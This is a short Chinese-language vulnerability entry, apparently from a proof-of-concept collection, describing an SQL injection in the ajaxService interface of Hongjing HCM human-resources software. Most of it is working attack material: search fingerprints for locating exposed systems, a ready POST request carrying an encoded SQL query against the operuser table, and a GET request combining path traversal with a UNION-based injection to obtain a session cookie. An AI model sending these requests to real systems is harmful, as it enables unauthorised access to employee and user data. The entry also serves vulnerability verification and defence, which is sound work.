﻿# 宏景HCM-SQL注入-ajaxService

> 更新时间：2024-05-20

> 漏洞编号：

> 漏洞说明：该漏洞存在于宏景EHR人力资源管理系统的 ajaxService 接口处，该功能存在SQL注入漏洞。攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

> 漏洞特征：icon_hash="947874108" || body='<div class="hj-hy-all-one-logo"' || app="HJSOFT-HCM"

> 验证脚本：HTTP

```
POST /ajax/ajaxService HTTP/1.1
Cookie: JSESSIONID=8A569640D4EE7D518A536CC263DCBBB3
Content-Type: application/x-www-form-urlencoded

__type=extTrans&__xml={"functionId":"151211001137","sql":"select~20111*111~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
```

> 响应代码特征：200

> 响应内容特征：12321

> 上传文件定位：

> 验证文件来源：宏景HCM-SQL注入-ajaxService.poc

```
POC复现：
1.获取cookie
GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1%27%20UNION%20ALL%20SELECT%2018%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28SYSDATETIME%28%29%3DSYSDATETIME%28%29%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2C18--%20ltAi HTTP/1.1
响应：200，返回值：Set-Cookie:JSESSIONID=8A569640D4EE7D518A536CC263DCBBB3;-Path=/
2.上面POC
```